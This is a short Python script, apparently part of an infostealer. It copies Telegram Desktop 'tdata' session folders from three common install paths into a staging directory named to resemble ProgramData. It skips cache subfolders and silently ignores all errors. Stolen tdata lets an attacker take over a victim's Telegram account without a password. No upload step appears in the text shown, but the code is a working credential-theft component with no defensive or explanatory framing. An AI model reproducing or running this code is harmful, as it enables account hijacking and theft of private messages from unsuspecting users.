import os
import shutil

path1 = r'D:\Telegram Desktop\tdata'
path2 = os.environ['USERPROFILE'] + r"\AppData\Roaming\Telegram Desktop\tdata"
path3 = r'C:\Program Files\Telegram Desktop\tdata'

directory = r'C:\ProgramDate\Telegram'


def Telegram():
    try:
        shutil.copytree(path1,
                        directory,
                        ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2",
                                                      "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path2,
                        directory,
                        ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2",
                                                      "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path3,
                        directory,
                        ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2",
                                                      "user_data#3"))
    except:
        pass
